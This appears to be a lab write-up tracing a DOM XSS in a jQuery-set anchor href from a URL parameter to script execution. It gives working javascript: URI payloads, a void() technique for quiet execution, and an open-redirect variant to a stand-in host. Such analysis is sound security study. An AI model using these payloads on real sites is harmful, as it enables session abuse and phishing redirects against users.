# Attack Chain — DOM XSS via jQuery anchor href(source: location.search)

## The vulnerable code (as served verbatim to every client)
```html
<a id="backLink">Back</a>
…
<script>
    $(function() {
        $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
    });
</script>
```
(jQuery 1.8.2 loaded from `/resources/js/jquery_1-8-2.js`; sink runs on DOM-ready.)

## Data flow
```
Victim URL          /feedback?returnPath=javascript:alert(1)
   │
   ▼
[SOURCE] window.location.search                        -> ?returnPath=javascript%3Aalert(1)
   │
   ▼
new URLSearchParams(...).get('returnPath')             -> `javascript:alert(1)` (decoded once)
   │
   ▼
[SINK] $('#backLink').attr("href", value)              -> <a id="backLink" href="javascript:alert(1)">Back</a>
   │   whole-attribute assignment via jQuery; no breakout needed
   ▼
[INTERACTION GATE] victim clicks the "Back" link
   │
   ▼
[TRUST BOUNDARY CROSSED] browser navigates to a javascript: URI → code executes
in the page's origin with the victim's cookies/context
   ▼
RESULT: alert(1) runs in app origin
```

## Why `javascript:` and why a click
- Setting `.attr("href", …)` never parses markup and never executes anything by itself —
  it only plants a navigation target. Execution happens when the browser **follows** the
  link, and only a `javascript:` (or equivalent script-capable) scheme turns navigation
  into code execution. `data:text/html` does NOT execute in this position (it navigates
  to a new document, losing the origin context relevant here).
- Consequences for payload shape: the payload is a **URI**, not HTML — no `<`, `>`, `"`,
  or tag-breakout characters are involved at all. Single-encode only URI-significant
  characters (`:` → `%3A` etc.).

## The `void()` nuance (verified behavior)
- `javascript:EXPR` where EXPR returns a **string** replaces the current document's
  content with that string (no navigation away). Observed: clicking
  `javascript:document.title='CLICKFIRED'` emptied `<title>` — the page became a
  plaintext document `CLICKFIRED`. Execution proven, but page destroyed (noisy).
- `javascript:void(EXPR)` returns `undefined` → no replacement; page intact, side
  effects (e.g. title change) observable. Observed: `title after click: CLICKFIRED2`.
- For lab/alert delivery this distinction is irrelevant (`alert()` returns undefined),
  but for **proof harnesses** always wrap in `void(...)` so assertions run against the
  live page.

## Expected response sequence (verified)
1. `GET /feedback?returnPath=<anything>` → 200; fixed page, zero server reflection of
   the value (pure DOM sink).
2. DOM-ready: jQuery sets `#backLink[href]` to the decoded value (attribute proof).
3. Click → `javascript:` executes (click proof via CDP; lab acceptance via real tab).

## Secondary mechanism in the same sink (open redirect)
Because the attribute accepts an **arbitrary string**, `returnPath=https://evil.example/`
yields `<a id="backLink" href="https://evil.example/">` — clicking navigates off-site.
Same sink, second impact: no validation, no allow-list, no confirmation.